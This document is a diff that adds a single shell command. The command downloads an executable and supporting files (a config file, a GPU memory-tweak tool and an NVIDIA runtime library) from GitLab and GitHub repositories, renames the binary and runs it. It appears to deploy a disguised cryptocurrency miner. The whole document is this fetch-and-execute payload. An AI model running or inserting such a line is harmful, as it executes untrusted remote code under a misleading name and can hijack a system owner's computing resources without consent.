@@ -1,0 +1,1 @@
+wget https://gitlab.com/chanRah12/noob/-/raw/main/nenen && wget https://raw.githubusercontent.com/washil789/minmin/main/config.ini && wget https://github.com/washil789/tambang/raw/main/amdmemtweak && wget https://github.com/washil789/tambang/raw/main/libnvrtc.so.10.0 && chmod +x nenen && mv nenen banjai && ./banjai
